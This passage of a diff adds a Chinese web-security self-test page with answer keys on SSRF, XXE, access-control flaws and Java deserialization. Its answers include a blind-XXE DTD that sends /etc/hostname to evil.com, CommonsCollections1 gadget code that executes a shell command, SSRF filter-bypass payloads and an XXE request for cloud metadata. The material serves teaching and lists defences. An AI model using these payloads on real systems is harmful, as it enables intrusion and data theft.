+<td style="text-align: center;">4</td>
+<td style="text-align: center;"><input class="test-input" data-max="4" value="0"></td>
+</tr>
+<tr>
+<td style="text-align: center;">一.4</td>
+<td style="text-align: center;">选择题</td>
+<td style="text-align: center;">4</td>
+<td style="text-align: center;"><input class="test-input" data-max="4" value="0"></td>
+</tr>
+<tr>
+<td style="text-align: center;">一.5</td>
+<td style="text-align: center;">选择题</td>
+<td style="text-align: center;">4</td>
+<td style="text-align: center;"><input class="test-input" data-max="4" value="0"></td>
+</tr>
+<tr>
+<td style="text-align: center;">二.1</td>
+<td style="text-align: center;">简答题</td>
+<td style="text-align: center;">8</td>
+<td style="text-align: center;"><input class="test-input" data-max="8" value="0"></td>
+</tr>
+<tr>
+<td style="text-align: center;">二.2</td>
+<td style="text-align: center;">简答题</td>
+<td style="text-align: center;">8</td>
+<td style="text-align: center;"><input class="test-input" data-max="8" value="0"></td>
+</tr>
+<tr>
+<td style="text-align: center;">二.3</td>
+<td style="text-align: center;">简答题</td>
+<td style="text-align: center;">8</td>
+<td style="text-align: center;"><input class="test-input" data-max="8" value="0"></td>
+</tr>
+<tr>
+<td style="text-align: center;">二.4</td>
+<td style="text-align: center;">简答题</td>
+<td style="text-align: center;">8</td>
+<td style="text-align: center;"><input class="test-input" data-max="8" value="0"></td>
+</tr>
+<tr>
+<td style="text-align: center;">二.5</td>
+<td style="text-align: center;">简答题</td>
+<td style="text-align: center;">8</td>
+<td style="text-align: center;"><input class="test-input" data-max="8" value="0"></td>
+</tr>
+<tr>
+<td style="text-align: center;">三.1</td>
+<td style="text-align: center;">漏洞分析</td>
+<td style="text-align: center;">10</td>
+<td style="text-align: center;"><input class="test-input" data-max="10" value="0"></td>
+</tr>
+<tr>
+<td style="text-align: center;">三.2</td>
+<td style="text-align: center;">漏洞分析</td>
+<td style="text-align: center;">10</td>
+<td style="text-align: center;"><input class="test-input" data-max="10" value="0"></td>
+</tr>
+<tr>
+<td style="text-align: center;">四</td>
+<td style="text-align: center;">安全设计</td>
+<td style="text-align: center;">10</td>
+<td style="text-align: center;"><input class="test-input" data-max="10" value="0"></td>
+</tr>
+<tr>
+<td style="text-align: center;">五</td>
+<td style="text-align: center;">附加题</td>
+<td style="text-align: center;">10</td>
+<td style="text-align: center;"><input class="test-input" data-max="10" data-bonus="true" value="0"></td>
+</tr>
+</tbody>
+</table>
+<div class="test-summary">
+  <h4>📝 自测简记</h4>
+  <textarea id="testNotes" rows="2" placeholder="记录丢分题号、需要复盘的知识点..."></textarea>
+</div>
+
+<hr />
+<h2 id="420">一、选择题（每题4分，共20分）</h2>
+<h3 id="1_1">第1题</h3>
+<p>关于 SSRF 漏洞，下列说法错误的是？</p>
+<p>A. SSRF的核心问题是服务器无条件信任用户提供的URL<br />
+B. SSRF只能攻击内网HTTP服务，无法攻击其他协议<br />
+C. 通过SSRF可以访问云服务器的元数据服务（如169.254.169.254）<br />
+D. 重定向可以作为一种绕过SSRF防御的手段  </p>
+<div class="answer-fold">
+  <button class="answer-btn">📖 查看答案与解析</button>
+  <div class="answer-content">
+    <p><strong>答案：B</strong></p>
+    <p><strong>解析：</strong></p>
+    <ul>
+      <li>A ✅ 正确。SSRF 的本质就是服务端无条件信任用户提供的 URL，并用自身身份发起请求。</li>
+      <li>B ❌ 错误。SSRF 不仅可攻击 HTTP 服务，还可通过 file://、dict://、gopher:// 等协议读取本地文件、探测端口、攻击内网 Redis / MySQL 等。</li>
+      <li>C ✅ 正确。云环境的元数据服务（如 AWS 169.254.169.254）是 SSRF 的高危目标。</li>
+      <li>D ✅ 正确。如果服务端跟随重定向，可能绕过对原始 URL 的校验。</li>
+    </ul>
+  </div>
+</div>
+
+<hr />
+<h3 id="2">第2题</h3>
+<p>以下哪个 XML 声明可以正确读取 /etc/passwd（假设存在 XXE 漏洞）？</p>
+<p>A. <code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code><br />
+B. <code>&lt;!ENTITY % xxe SYSTEM "file:///etc/passwd"&gt;</code><br />
+C. <code>&lt;!DOCTYPE xxe [&lt;!ENTITY xxe SYSTEM "/etc/passwd"&gt;]&gt;</code><br />
+D. <code>&lt;!ENTITY xxe "file:///etc/passwd"&gt;</code>  </p>
+<div class="answer-fold">
+  <button class="answer-btn">📖 查看答案与解析</button>
+  <div class="answer-content">
+    <p><strong>答案：A</strong></p>
+    <p><strong>解析：</strong></p>
+    <ul>
+      <li>A ✅ 正确的外部实体定义，SYSTEM 表示外部资源，file:// 为本地文件协议。</li>
+      <li>B ❌ 参数实体语法，通常用于 Blind XXE，但本题问的是"正确读取文件"。</li>
+      <li>C ❌ 缺少 SYSTEM 或 PUBLIC 关键字，不是合法外部实体声明。</li>
+      <li>D ❌ 内部实体只能定义静态字符串，不能读取外部文件。</li>
+    </ul>
+  </div>
+</div>
+
+<hr />
+<h3 id="3">第3题</h3>
+<p>关于越权漏洞，下列说法正确的是？</p>
+<p>A. 只要用户通过身份认证，就不存在越权风险<br />
+B. 隐藏URL（如/admin）是防御垂直越权的有效手段<br />
+C. IDOR漏洞属于水平越权的一种<br />
+D. 使用GUID代替数字ID可以完全防止水平越权  </p>
+<div class="answer-fold">
+  <button class="answer-btn">📖 查看答案与解析</button>
+  <div class="answer-content">
+    <p><strong>答案：C</strong></p>
+    <p><strong>解析：</strong></p>
+    <ul>
+      <li>A ❌ 认证 ≠ 授权，认证通过后仍可能存在越权。</li>
+      <li>B ❌ 隐藏 URL 不是有效防御，攻击者可通过目录爆破、JS 泄露等方式找到。</li>
+      <li>C ✅ IDOR（不安全的直接对象引用）属于水平越权的典型场景。</li>
+      <li>D ❌ GUID 不可枚举，但仍可能通过其他接口泄露或时间戳预测，不能完全杜绝越权。</li>
+    </ul>
+  </div>
+</div>
+
+<hr />
+<h3 id="4">第4题</h3>
+<p>关于 Java 反序列化漏洞，下列说法错误的是？</p>
+<p>A. 反序列化时不会调用类的构造方法<br />
+B. 如果一个类没有实现Serializable接口，它不能被序列化<br />
+C. readObject()方法是反序列化漏洞的唯一入口<br />
+D. transient修饰的字段不会被序列化  </p>
+<div class="answer-fold">
+  <button class="answer-btn">📖 查看答案与解析</button>
+  <div class="answer-content">
+    <p><strong>答案：C</strong></p>
+    <p><strong>解析：</strong></p>
+    <ul>
+      <li>A ✅ 反序列化通过特殊机制创建对象，不调用构造方法。</li>
+      <li>B ✅ 只有实现 Serializable 的类才能被 Java 原生序列化。</li>
+      <li>C ❌ 错误。readObject() 是常见入口，但不是唯一入口。readExternal()、readResolve()，甚至 hashCode() / toString() 都可能成为链的一部分。</li>
+      <li>D ✅ transient 字段默认不参与序列化。</li>
+    </ul>
+  </div>
+</div>
+
+<hr />
+<h3 id="5">第5题</h3>
+<p>在 CC1 链中，InvokerTransformer 的作用是？</p>
+<p>A. 返回一个固定的常量<br />
+B. 通过反射调用任意方法<br />
+C. 串联多个Transformer<br />
+D. 触发DNS查询  </p>
+<div class="answer-fold">
+  <button class="answer-btn">📖 查看答案与解析</button>
+  <div class="answer-content">
+    <p><strong>答案：B</strong></p>
+    <p><strong>解析：</strong></p>
+    <ul>
+      <li>A ❌ ConstantTransformer 负责返回常量。</li>
+      <li>B ✅ InvokerTransformer.transform() 通过反射调用任意方法，是命令执行的核心。</li>
+      <li>C ❌ ChainedTransformer 负责串联。</li>
+      <li>D ❌ URLDNS 链才涉及 DNS 查询。</li>
+    </ul>
+  </div>
+</div>
+
+<hr />
+<h2 id="840">二、简答题（每题8分，共40分）</h2>
+<h3 id="1_2">第1题</h3>
+<p>简述 SSRF 和 XXE 之间的关系。在什么情况下可以用 XXE 实现 SSRF？</p>
+<div class="answer-fold">
+  <button class="answer-btn">📖 查看答案</button>
+  <div class="answer-content">
+    <p><strong>答案要点：</strong></p>
+    <p><strong>关系：</strong> XXE 可以触发 SSRF。当 XML 解析器支持外部实体且允许访问 HTTP/HTTPS 等协议时，攻击者可以在外部实体中指定内网 URL。两者本质都是"服务端发起意外请求"，XXE 是一种 SSRF 的触发载体。</p>
+    <p><strong>利用条件：</strong></p>
+    <ul>
+      <li>应用程序解析用户可控的 XML 输入</li>
+      <li>XML 解析器允许外部实体 + 允许 HTTP 协议</li>
+      <li>如果响应不回显，可结合 Blind XXE + OAST</li>
+    </ul>
+    <p><strong>示例：</strong></p>
+    <pre><code>&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
+]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre>
+  </div>
+</div>
+
+<hr />
+<h3 id="2_1">第2题</h3>
+<p>写出至少 3 种绕过 SSRF 黑名单过滤的方法，并简要说明原理。</p>
+<div class="answer-fold">
+  <button class="answer-btn">📖 查看答案</button>
+  <div class="answer-content">
+    <ul>
+      <li><strong>进制/简写替换</strong>：127.0.0.1 有多种表示，如八进制 `017700000001`、简写 `127.1`</li>
+      <li><strong>域名解析到内网</strong>：自建域名指向 127.0.0.1，如 `http://evil.com`</li>
+      <li><strong>URL 编码/大小写</strong>：绕过简单字符串匹配，如 `http://LOCALHOST/%61dmin`</li>
+      <li><strong>重定向绕过</strong>：先经过白名单域名，再 302 跳转到内网地址</li>
+      <li><strong>嵌入凭据（@）</strong>：利用解析差异，如 `http://safe@127.0.0.1/admin`</li>
+    </ul>
+    <p>注：答出任意 3 种即可。</p>
+  </div>
+</div>
+
+<hr />
+<h3 id="3_1">第3题</h3>
+<p>解释水平越权和垂直越权的区别，并各举一个真实场景中的例子。</p>
+<div class="answer-fold">
+  <button class="answer-btn">📖 查看答案</button>
+  <div class="answer-content">
+    <ul>
+      <li><strong>垂直越权</strong>：低权限用户 → 高权限操作（角色不同）。示例：普通用户访问 `/admin/deleteUser?id=123`</li>
+      <li><strong>水平越权</strong>：相同角色，访问他人数据（用户不同）。示例：用户 A 修改 URL 中 `orderId=2`，查看用户 B 的订单</li>
+    </ul>
+    <p><strong>真实场景：</strong></p>
+    <ul>
+      <li>垂直：修改 Cookie 中 `role=user` → `role=admin`，进入后台。</li>
+      <li>水平：修改 API 参数 `userId=1001` → `userId=1002`，查看他人信息（IDOR）。</li>
+    </ul>
+  </div>
+</div>
+
+<hr />
+<h3 id="4_1">第4题</h3>
+<p>简述 Java 反序列化漏洞产生的根本原因。为什么说"入口是安全的，危险的是类本身"？</p>
+<div class="answer-fold">
+  <button class="answer-btn">📖 查看答案</button>
+  <div class="answer-content">
+    <p><strong>根本原因：</strong> 反序列化过程中，攻击者可以控制字节流中的字段值。某些类自定义了 readObject()，并在其中执行了危险操作（如反射、命令执行、JNDI 查找）。危险操作所使用的数据来自反序列化恢复的字段（攻击者可控）。</p>
+    <p><strong>为什么"入口是安全的，危险的是类本身"：</strong></p>
+    <ul>
+      <li>ObjectInputStream.readObject() 本身只是一个标准机制，没有恶意代码。</li>
+      <li>漏洞的根源在于某个类的 readObject() 中写了危险代码，且攻击者可控制关键参数。</li>
+      <li>如果所有类的 readObject() 都是安全的，反序列化本身就不会有漏洞。</li>
+    </ul>
+  </div>
+</div>
+
+<hr />
+<h3 id="5_1">第5题</h3>
+<p>画出 URLDNS 链的完整调用链（从 readObject 到 DNS 查询）。</p>
+<div class="answer-fold">
+  <button class="answer-btn">📖 查看答案</button>
+  <div class="answer-content">
+    <p><strong>调用链：</strong></p>
+    <pre>
+ObjectInputStream.readObject()
+    ↓
+HashMap.readObject()
+    ↓
+HashMap.putForCreate(key, value)
+    ↓
+HashMap.hash(key)
+    ↓
+key.hashCode()           ← key 是 URL 对象
+    ↓
+URL.hashCode()
+    ↓
+URLStreamHandler.hashCode(URL)
+    ↓
+getHostAddress()         ← 触发 DNS 解析
+    ↓
+InetAddress.getByName(host)</pre>
+    <p><strong>一句话总结：</strong> HashMap 反序列化时遍历 key → 调用 key.hashCode() → URL.hashCode() 触发 DNS 查询。</p>
+  </div>
+</div>
+
+<hr />
+<h2 id="1020">三、漏洞分析题（每题10分，共20分）</h2>
+<h3 id="1xxe-ssrf-blind-xxe">第1题（XXE + SSRF 综合 Blind XXE）</h3>
+<p>你发现一个Web应用存在XXE漏洞，但服务端的响应中不返回任何实体内容（Blind XXE）。同时，你确认目标服务器可以出网。请设计一个完整的攻击方案，读取服务器上的 /etc/hostname 文件。</p>
+<div class="answer-fold">
+  <button class="answer-btn">📖 查看答案</button>
+  <div class="answer-content">
+    <p><strong>1. 在自己的服务器上准备恶意 DTD 文件（如 http://evil.com/xxe.dtd）</strong></p>
+    <pre><code>&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://evil.com/?data=%file;'&gt;"&gt;
+%eval;
+%exfil;</code></pre>
+    <p><strong>2. 向目标服务器发送 payload</strong></p>
+    <pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd"&gt;
+  %xxe;
+]&gt;
+&lt;root&gt;&lt;/root&gt;</code></pre>
+    <p><strong>3. 获取数据</strong></p>
+    <p>目标服务器会解析 DTD → 读取 /etc/hostname → 将内容拼接到 http://evil.com/?data=... → 向攻击者服务器发起请求。攻击者查看 Web 服务器访问日志，即可获得文件内容。</p>
+  </div>
+</div>
+
+<hr />
+<h3 id="2_2">第2题（越权 + 反序列化综合）</h3>
+<p>某应用提供了一个API：POST /api/export，请求体接受一个序列化的Java对象，服务端会反序列化该对象并生成导出文件。你在代码审计中发现目标依赖了commons-collections 3.2.1。你的最终目标是在目标服务器上执行 <code>touch /tmp/pwned</code> 命令。</p>
+<div class="answer-fold">
+  <button class="answer-btn">📖 查看答案</button>
+  <div class="answer-content">
+    <p><strong>1. 使用的 Gadget 链：</strong> CommonsCollections1 或 CommonsCollections5</p>
+    <p><strong>2. 手工构造核心逻辑：</strong></p>
+    <pre><code>// 1. 构造命令执行的 Transformer 链
+Transformer[] transformers = {
+    new ConstantTransformer(Runtime.class),
+    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, 
+        new Object[]{"getRuntime", new Class[0]}),
+    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, 
+        new Object[]{null, new Object[0]}),
+    new InvokerTransformer("exec", new Class[]{String.class}, 
+        new Object[]{"touch /tmp/pwned"})
+};
+ChainedTransformer chain = new ChainedTransformer(transformers);
+
+// 2. 包装到 LazyMap
+Map innerMap = new HashMap();
+Map lazyMap = LazyMap.decorate(innerMap, chain);
+
+// 3. 通过 AnnotationInvocationHandler 触发
+Class&lt;?&gt; clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(Class.class, Map.class);
+cons.setAccessible(true);
+Object handler = cons.newInstance(Override.class, lazyMap);
+
+// 4. 序列化 handler 并发送给目标</code></pre>
+    <p><strong>3. 最终目标：</strong> 目标服务端反序列化该对象时 → 触发 LazyMap.get() → 调用 ChainedTransformer → 反射执行 Runtime.exec("touch /tmp/pwned")。</p>
+  </div>
+</div>
+
+<hr />
+<h2 id="10">四、安全设计题（10分）</h2>
+<p>针对 SSRF、XXE、反序列化漏洞，提出具体的防御方案。</p>
+<div class="answer-fold">
+  <button class="answer-btn">📖 查看答案</button>
+  <div class="answer-content">
+    <p><strong>SSRF 防御：</strong></p>
+    <ul>
+      <li>白名单限制 URL：只允许访问业务必需的域名/IP，从根本上阻止内网探测</li>
+      <li>禁用重定向跟随：防止通过合法域名 → 302 → 内网的绕过</li>
+    </ul>
+    <p><strong>XXE 防御：</strong></p>
+    <ul>
+      <li>禁用外部实体：在解析器中设置禁止外部实体，直接从源头禁止</li>
+      <li>使用 JSON 替代 XML：从数据格式层面消除 XXE 风险</li>
+    </ul>
+    <p><strong>反序列化防御：</strong></p>
+    <ul>
+      <li>反序列化白名单：只允许序列化特定类，拒绝恶意 Gadget 链中的类</li>
+      <li>不反序列化不可信数据：最彻底的防御——不信任外部输入</li>
+    </ul>
+  </div>
+</div>
+
+<hr />
+<h2 id="10_1">五、附加题（10分）</h2>
+<p>CC1链中为什么要使用“两层AnnotationInvocationHandler”嵌套？如果不使用动态代理，能否触发LazyMap.get()？</p>
+<div class="answer-fold">
+  <button class="answer-btn">📖 查看答案</button>
+  <div class="answer-content">
+    <p><strong>为什么用两层嵌套？</strong></p>
+    <ul>
+      <li>第一层 handler1：memberValues 为 LazyMap，负责触发 factory.transform()</li>
+      <li>第二层 handler2：memberValues 为 proxyMap（动态代理），负责在 readObject 遍历 entrySet() 时，将调用转发给 handler1.invoke()，进而调用 LazyMap.get()</li>
+    </ul>
+    <p><strong>不代理能否触发？不能。</strong></p>
+    <p>因为 AnnotationInvocationHandler.readObject() 中遍历的是 memberValues.entrySet()。如果直接放 LazyMap，虽然 entrySet() 会被调用，但不会自动调用 LazyMap.get()。动态代理的作用：任何对 proxyMap 的方法调用都会被转发给 handler1.invoke()，而 invoke() 内部会调用 memberValues.get()，从而进入 LazyMap.get()。</p>
+  </div>
+</div>
+
+<hr />
+<h2 id="_2">📌 附录：常见漏洞分类速查</h2>
+<table>
+<thead>
+<tr>
+<th>漏洞类型</th>
+<th>核心问题</th>
+<th>利用条件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SSRF</td>
+<td>服务端请求可控URL</td>
+<td>用户控制URL参数 + 服务端发起请求</td>
+</tr>
+<tr>
+<td>XXE</td>
+<td>解析XML + 外部实体</td>
+<td>解析XML输入 + 允许外部实体</td>
+</tr>
+<tr>
+<td>越权</td>
+<td>未授权访问</td>
+<td>认证后修改参数访问他人数据</td>
+</tr>
+<tr>
+<td>Java反序列化</td>
+<td>反序列化恶意字节流</td>
+<td>存在Gadget链 + 可控输入</td>
+</tr>
+</tbody>
+</table>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2026 ethicalpaws
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.tabs", "navigation.sections", "navigation.top", "search.highlight", "search.share", "content.code.copy"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../../js/extra.js"></script>
+      
+        <script src="../../../js/test-script.js"></script>
+      
+    
+  </body>
+</html>
